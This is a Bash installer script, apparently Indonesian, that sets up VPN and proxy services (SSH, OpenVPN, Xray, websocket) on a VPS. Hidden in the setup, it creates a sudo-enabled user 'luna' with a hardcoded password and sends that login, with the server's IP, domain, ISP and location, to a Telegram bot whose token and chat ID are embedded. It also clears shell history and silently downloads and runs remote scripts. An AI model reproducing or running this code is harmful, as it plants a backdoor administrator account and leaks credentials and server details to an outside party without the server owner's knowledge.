#!/bin/bash
Ip_Vps=$(curl -sS ipv4.icanhazip.com)

# Definisikan warna
tyblue='\033[1;34m'
NC='\033[0m'

# Instalasi python3 dan pip
apt install python3 -y
apt install python3-pip -y
pip install requests

# Fungsi untuk menambahkan domain
function ADDON_DOMAINS() {
    clear
    cd
    echo -e "${tyblue}┌──────────────────────────────────────────┐${NC}"
    echo -e "${tyblue}│ \033[1;37mPlease select a your Choice to Set Domain${tyblue}│${NC}"
    echo -e "${tyblue}└──────────────────────────────────────────┘${NC}"
    echo -e "${tyblue}┌──────────────────────────────────────────┐${NC}"
    echo -e "${tyblue}│  [ 1 ]  \033[1;37mDomain kamu sendiri            ${NC}"
    echo -e "${tyblue}│  [ 2 ]  \033[1;37mDomain Yang Punya Script      ${NC}"
    echo -e "${tyblue}└──────────────────────────────────────────┘${NC}"

    until [[ $SELECT_DOMAIN =~ ^[132]+$ ]]; do 
        read -p "   Please select numbers 1  atau 2 : " SELECT_DOMAIN
    done

    if [[ $SELECT_DOMAIN == "1" ]]; then
        clear
        echo -e  "${tyblue}┌──────────────────────────────────────────┐${NC}"
        echo -e  "${tyblue}│              \033[1;37mTERIMA KASIH                ${tyblue}│${NC}"
        echo -e  "${tyblue}│         \033[1;37mSUDAH MENGGUNAKAN SCRIPT         ${tyblue}│${NC}"
        echo -e  "${tyblue}│                \033[1;37mDARI SAYA                 ${tyblue}│${NC}"
        echo -e  "${tyblue}└──────────────────────────────────────────┘${NC}"
        echo " "
        until [[ $DOMAIN_INPUT =~ ^[a-zA-Z0-9_.-]+$ ]]; do 
            read -rp "Masukan domain kamu Disini : " -e DOMAIN_INPUT
        done

        # Hapus direktori dan buat ulang
        rm -rf /etc/xray /etc/v2ray /etc/nsdomain /etc/per
        mkdir -p /etc/xray /etc/v2ray /etc/nsdomain /var/lib

        # Buat file domain
        touch /etc/xray/domain /etc/v2ray/domain
        touch /etc/xray/slwdomain /etc/v2ray/scdomain

        # Simpan domain
        echo "$DOMAIN_INPUT" > /root/domain
        echo "$DOMAIN_INPUT" > /root/scdomain
        echo "$DOMAIN_INPUT" > /etc/xray/scdomain
        echo "$DOMAIN_INPUT" > /etc/v2ray/scdomain
        echo "$DOMAIN_INPUT" > /etc/xray/domain
        echo "$DOMAIN_INPUT" > /etc/v2ray/domain

        # Simpan IP
        echo "IP=$DOMAIN_INPUT" > /var/lib/ipvps.conf

        clear
    fi

    if [[ $SELECT_DOMAIN == "2" ]]; then
        clear
        curl -s https://raw.githubusercontent.com/ianlunatix/ltfrox/main/pointing.py -o pointing.py
        python3 pointing.py
    fi
}

ADDON_DOMAINS


# Membuat direktori yang diperlukan
mkdir -p /var/lib /etc/ianlunatix /etc/ianlunatix/theme


cat <<EOF>> /etc/ianlunatix/theme/red
BG : \E[40;1;41m
TEXT : \033[0;31m
EOF
cat <<EOF>> /etc/ianlunatix/theme/green
BG : \E[40;1;42m
TEXT : \033[0;32m
EOF
cat <<EOF>> /etc/ianlunatix/theme/yellow
BG : \E[40;1;43m
TEXT : \033[0;33m
EOF
cat <<EOF>> /etc/ianlunatix/theme/red
BG : \E[40;1;41m
TEXT : \033[0;31m
EOF
cat <<EOF>> /etc/ianlunatix/theme/blue
BG : \E[40;1;44m
TEXT : \033[0;34m
EOF
cat <<EOF>> /etc/ianlunatix/theme/magenta
BG : \E[40;1;45m
TEXT : \033[0;35m
EOF
cat <<EOF>> /etc/ianlunatix/theme/cyan
BG : \E[40;1;46m
TEXT : \033[0;36m
EOF
cat <<EOF>> /etc/ianlunatix/theme/lightgray
BG : \E[40;1;47m
TEXT : \033[0;37m
EOF
cat <<EOF>> /etc/ianlunatix/theme/darkgray
BG : \E[40;1;100m
TEXT : \033[0;90m
EOF
cat <<EOF>> /etc/ianlunatix/theme/lightred
BG : \E[40;1;101m
TEXT : \033[0;91m
EOF
cat <<EOF>> /etc/ianlunatix/theme/lightgreen
BG : \E[40;1;102m
TEXT : \033[0;92m
EOF
cat <<EOF>> /etc/ianlunatix/theme/lightyellow
BG : \E[40;1;103m
TEXT : \033[0;93m
EOF
cat <<EOF>> /etc/ianlunatix/theme/lightblue
BG : \E[40;1;104m
TEXT : \033[0;94m
EOF
cat <<EOF>> /etc/ianlunatix/theme/lightmagenta
BG : \E[40;1;105m
TEXT : \033[0;95m
EOF
cat <<EOF>> /etc/ianlunatix/theme/lightcyan
BG : \E[40;1;106m
TEXT : \033[0;96m
EOF
cat <<EOF>> /etc/ianlunatix/theme/color.conf
lightcyan
EOF

function Casper2(){
cd
sysctl -w net.ipv6.conf.all.disable_ipv6=1 >/dev/null 2>&1
sysctl -w net.ipv6.conf.default.disable_ipv6=1 >/dev/null 2>&1
clear
wget https://raw.githubusercontent.com/ianlunatix/ltfrox/main/tools.sh &> /dev/null
chmod +x tools.sh 
bash tools.sh
clear
start=$(date +%s)
ln -fs /usr/share/zoneinfo/Asia/Jakarta /etc/localtime
apt install git curl -y >/dev/null 2>&1
apt install python -y >/dev/null 2>&1
}
function Casper3(){
fun_bar() {
    CMD[0]="$1"
    CMD[1]="$2"
    (
        [[ -e $HOME/fim ]] && rm $HOME/fim
        ${CMD[0]} -y >/dev/null 2>&1
        ${CMD[1]} -y >/dev/null 2>&1
        touch $HOME/fim
    ) >/dev/null 2>&1 &
    tput civis
    echo -ne "  \033[0;33mLagi Menginstal File \033[1;37m- \033[0;33m["
    while true; do
        for ((i = 0; i < 18; i++)); do
            echo -ne "\033[0;32m#"
            sleep 0.1s
        done
        [[ -e $HOME/fim ]] && rm $HOME/fim && break
        echo -e "\033[0;33m]"
        sleep 1s
        tput cuu1
        tput dl1
        echo -ne "  \033[0;33mLagi Menginstal File \033[1;37m- \033[0;33m["
    done
    echo -e "\033[0;33m]\033[1;37m -\033[1;32m Succes !\033[1;37m"
    tput cnorm
}


res2() {
wget https://raw.githubusercontent.com/ianlunatix/ltfrox/main/install/ssh-vpn.sh && chmod +x ssh-vpn.sh && ./ssh-vpn.sh
clear
} 

res3() {
wget https://raw.githubusercontent.com/ianlunatix/ltfrox/main/install/ins-xray.sh && chmod +x ins-xray.sh && ./ins-xray.sh
clear
}

res4() {
wget https://raw.githubusercontent.com/ianlunatix/ltfrox/main/sshws/insshws.sh && chmod +x insshws.sh && ./insshws.sh
clear
}

res5() {
wget https://raw.githubusercontent.com/ianlunatix/ltfrox/main/install/set-br.sh && chmod +x set-br.sh && ./set-br.sh
clear
}

res6() {
wget https://raw.githubusercontent.com/ianlunatix/ltfrox/main/sshws/ohp.sh && chmod +x ohp.sh && ./ohp.sh
clear
}

res7() {
wget https://raw.githubusercontent.com/ianlunatix/ltfrox/main/menu/update && chmod +x update && ./update
clear
}

res8() {
wget https://raw.githubusercontent.com/RMBL-ZERO/vip/main/slowdns/installsl.sh && chmod +x installsl.sh && bash installsl.sh
clear
}

res9() {
wget https://raw.githubusercontent.com/ianlunatix/ltfrox/main/install/udp-custom.sh && chmod +x udp-custom.sh && bash udp-custom.sh
clear
}

echo -e "${tyblue}┌──────────────────────────────────────────┐${NC}"
echo -e "${tyblue}│      PROCESS INSTALLED SSH & OPENVPN     │${NC}"
echo -e "${tyblue}└──────────────────────────────────────────┘${NC}"
fun_bar 'res2'

echo -e "${tyblue}┌──────────────────────────────────────────┐${NC}"
echo -e "${tyblue}│           PROCESS INSTALLED XRAY         │${NC}"
echo -e "${tyblue}└──────────────────────────────────────────┘${NC}"
fun_bar 'res3'

echo -e "${tyblue}┌──────────────────────────────────────────┐${NC}"
echo -e "${tyblue}│       PROCESS INSTALLED WEBSOCKET SSH    │${NC}"
echo -e "${tyblue}└──────────────────────────────────────────┘${NC}"
fun_bar 'res4'

echo -e "${tyblue}┌──────────────────────────────────────────┐${NC}"
echo -e "${tyblue}│       PROCESS INSTALLED BACKUP MENU      │${NC}"
echo -e "${tyblue}└──────────────────────────────────────────┘${NC}"
fun_bar 'res5'

echo -e "${tyblue}┌──────────────────────────────────────────┐${NC}"
echo -e "${tyblue}│           PROCESS INSTALLED OHP          │${NC}"
echo -e "${tyblue}└──────────────────────────────────────────┘${NC}"
fun_bar 'res6'

echo -e "${tyblue}┌──────────────────────────────────────────┐${NC}"
echo -e "${tyblue}│           DOWNLOAD EXTRA MENU            │${NC}"
echo -e "${tyblue}└──────────────────────────────────────────┘${NC}"
fun_bar 'res7'

echo -e "${tyblue}┌──────────────────────────────────────────┐${NC}"
echo -e "${tyblue}│           DOWNLOAD SYSTEM                │${NC}"
echo -e "${tyblue}└──────────────────────────────────────────┘${NC}"
fun_bar 'res8'

echo -e "${tyblue}┌──────────────────────────────────────────┐${NC}"
echo -e "${tyblue}│           DOWNLOAD UDP COSTUM            │${NC}"
echo -e "${tyblue}└──────────────────────────────────────────┘${NC}"
fun_bar 'res9'
}

function iinfo(){
domain=$(cat /etc/xray/domain)
TIMES="10"
CHATID="6986825986"
KEY="7061907321:AAHATcUbggwvfcxDzyb8YGdDXJzaYyXj8v8"
URL="https://api.telegram.org/bot$KEY/sendMessage"
ISP=$(cat /etc/xray/isp)
CITY=$(cat /etc/xray/city)
domain=$(cat /etc/xray/domain) 
TIME=$(date +'%Y-%m-%d %H:%M:%S')
RAMMS=$(free -m | awk 'NR==2 {print $2}')
MODEL2=$(cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/=//g' | sed 's/"//g' | sed 's/PRETTY_NAME//g')
IZIN=$(curl -sS https://raw.githubusercontent.com/ianlunatix/ip_access/main/ip | grep $Ip_Vps | awk '{print $3}' )
d1=$(date -d "$IZIN" +%s)
d2=$(date -d "$today" +%s)
EXP=$(( (d1 - d2) / 86400 ))

TEXT="
<code>━━━━━━━━━━━━━━━━━━━━</code>
<code>⚠️ AUTOSCRIPT PREMIUM ⚠️</code>
<code>━━━━━━━━━━━━━━━━━━━━</code>
<code>USER : </code><code>${Username}</code>
<code>PASSWORD : </code><code>${Password}</code>
<code>NAME : </code><code>${author}</code>
<code>TIME : </code><code>${TIME} WIB</code>
<code>DOMAIN : </code><code>${domain}</code>
<code>IP : </code><code>${Ip_Vps}</code>
<code>ISP : </code><code>${ISP} $CITY</code>
<code>OS LINUX : </code><code>${MODEL2}</code>
<code>RAM : </code><code>${RAMMS} MB</code>
<code>EXP SCRIPT : </code><code>$EXP Days</code>
<code>━━━━━━━━━━━━━━━━━━━━</code>
<i> Notifikasi Installer Script...</i>
"'&reply_markup={"inline_keyboard":[[{"text":"🔥ᴏʀᴅᴇʀ","url":"https://t.me/iankhvica"},{"text":"🔥GRUP","url":"https://t.me/Configopok"}]]}'
curl -s --max-time $TIMES -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
clear
}
echo "net.netfilter.nf_conntrack_max=262144" >> /etc/sysctl.conf
echo "net.netfilter.nf_conntrack_tcp_timeout_time_wait=30" >> /etc/sysctl.conf
sudo sysctl -p

Username=luna
Password=LunatiX
mkdir -p /home/script/
useradd -r -d /home/script -s /bin/bash -M $Username > /dev/null 2>&1
echo -e "$Password\n$Password\n"|passwd $Username > /dev/null 2>&1
usermod -aG sudo $Username > /dev/null 2>&1
CEKIP
Casper3
cat> /root/.profile << END
if [ "$BASH" ]; then
if [ -f ~/.bashrc ]; then
. ~/.bashrc
fi
fi
mesg n || true
clear
menu
END
chmod 644 /root/.profile
if [ -f "/root/log-install.txt" ]; then
rm /root/log-install.txt > /dev/null 2>&1
fi
if [ -f "/etc/afak.conf" ]; then
rm /etc/afak.conf > /dev/null 2>&1
fi
if [ ! -f "/etc/log-create-user.log" ]; then
echo "Log All Account " > /etc/log-create-user.log
fi
history -c
serverV=$( curl -sS https://raw.githubusercontent.com/ianlunatix/ltfrox/main/versi  )
echo $serverV > /opt/.ver
aureb=$(cat /home/re_otm)
b=11
if [ $aureb -gt $b ]
then
gg="PM"
else
gg="AM"
fi
cd
curl -sS ifconfig.me > /etc/myipvps
curl -s ipinfo.io/city?token=75082b4831f909 >> /etc/xray/city
curl -s ipinfo.io/org?token=75082b4831f909  | cut -d " " -f 2-10 >> /etc/xray/isp
rm /root/setup.sh >/dev/null 2>&1
rm /root/slhost.sh >/dev/null 2>&1
rm /root/ssh-vpn.sh >/dev/null 2>&1
rm /root/ins-xray.sh >/dev/null 2>&1
rm /root/insshws.sh >/dev/null 2>&1
rm /root/set-br.sh >/dev/null 2>&1
rm /root/ohp.sh >/dev/null 2>&1
rm /root/update.sh >/dev/null 2>&1
rm /root/slowdns.sh >/dev/null 2>&1
rm /root/udp-custom.sh >/dev/null 2>&1
secs_to_human "$(($(date +%s) - ${start}))" | tee -a log-install.txt
sleep 3
echo  ""
cd
iinfo
echo -e "${tyblue}┌────────────────────────────────────────────┐${NC}"
echo -e "${tyblue}│  Install SCRIPT SELESAI..                  │${NC}"
echo -e "${tyblue}└────────────────────────────────────────────┘${NC}"
echo  ""
sleep 4
echo -e "[ ${yell}WARNING${NC} ] Do you want to reboot now ? (y/n)? "
read answer
if [ "$answer" == "${answer#[Yy]}" ] ;then
exit 0
else
reboot
fi
